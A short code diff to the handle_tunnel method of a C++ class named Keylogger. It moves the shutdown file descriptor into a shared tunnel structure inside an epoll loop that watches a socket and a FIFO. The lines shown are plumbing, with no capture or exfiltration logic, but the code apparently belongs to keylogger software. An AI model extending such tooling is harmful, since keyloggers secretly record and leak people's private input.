@@ -14,9 +14,9 @@ void Keylogger::handle_tunnel(int __socket, int __fifo_fd) {
     }
 
     struct epoll_event shutdown_event;
-    shutdown_event.data.fd = shutdown_event_fd_;
+    shutdown_event.data.fd = p_tunnel_fds_->shutdown_fd_;
     shutdown_event.events = EPOLLIN;
-    if (epoll_ctl(epoll_fd.fd, EPOLL_CTL_ADD, shutdown_event_fd_, &shutdown_event) == -1) {
+    if (epoll_ctl(epoll_fd.fd, EPOLL_CTL_ADD, p_tunnel_fds_->shutdown_fd_, &shutdown_event) == -1) {
         write_error(__fifo_fd, strerror(errno));
         return;
     }
@@ -28,6 +28,7 @@ void Keylogger::handle_tunnel(int __socket, int __fifo_fd) {
         write_error(__fifo_fd, strerror(errno));
         return;
     }
+    
     struct epoll_event events[2];
     while (!*p_shutdown_flag_) {
         int nfds = epoll_wait(epoll_fd.fd, events, 2, -1);
@@ -40,9 +41,9 @@ void Keylogger::handle_tunnel(int __socket, int __fifo_fd) {
         }
 
         for (int i=0;i<nfds;i++) {
-            if (events[i].data.fd == shutdown_event_fd_) {
+            if (events[i].data.fd == p_tunnel_fds_->shutdown_fd_) {
                 uint64_t u;
-                read(shutdown_event_fd_, &u, sizeof(u));
+                read(p_tunnel_fds_->shutdown_fd_, &u, sizeof(u));
                 break;
             } else if(events[i].data.fd == __socket) {
                 char buffer[16];
